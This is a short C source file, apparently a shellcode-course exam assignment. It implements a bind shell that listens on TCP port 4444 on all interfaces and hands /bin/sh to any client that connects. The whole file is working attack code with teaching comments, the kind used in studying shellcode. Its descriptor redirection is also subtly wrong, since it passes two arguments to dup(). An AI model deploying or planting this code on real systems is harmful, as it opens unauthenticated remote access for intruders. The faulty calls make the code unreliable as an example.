# SLAE Exam Assignment #1: Shell Bind TCP Shellcode - C Version
# Author: Ray Doyle (@doylersec)
# Website: https://www.doyler.net

#include <stdio.h>
#include <netinet/in.h>

// Define the port number to listen on
#define PORT 4444

int main(int argc, char **argv)
{
    // Create the socket (IPv4, TCP, and IP)
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    // Configure the addr values for the bind() call
    struct sockaddr_in address;
    // IPv4
    address.sin_family = AF_INET;
    // Bind to 0.0.0.0
    address.sin_addr.s_addr = INADDR_ANY;
    // Use the defined port (htons is used to fix the byte order)
    address.sin_port = htons(PORT);

    // Bind the socket to the specified IP/port
    bind(sock, (struct sockaddr *)&address, sizeof(address));

    // Listen on the socket
    listen(sock, 0);

    // Accept connections on the listening socket
    // NULLs are used because no information about the client is necessary - https://stackoverflow.com/questions/40689585
    // http://man7.org/linux/man-pages/man2/accept.2.html
    int new_sock = accept(sock, NULL, NULL);

    // Duplicate the file descriptors for STDIN, STDOUT, and STDERR to the newly created socket
    // This functions as a redirect for all input and output over the listening socket, allowing interacting with the executed program
    // http://man7.org/linux/man-pages/man2/dup.2.html
    dup(new_sock, 0);
    dup(new_sock, 1);
    dup(new_sock, 2);

    // Execute /bin/sh with no arguments or environment strings
    execve("/bin/sh", NULL, NULL);
}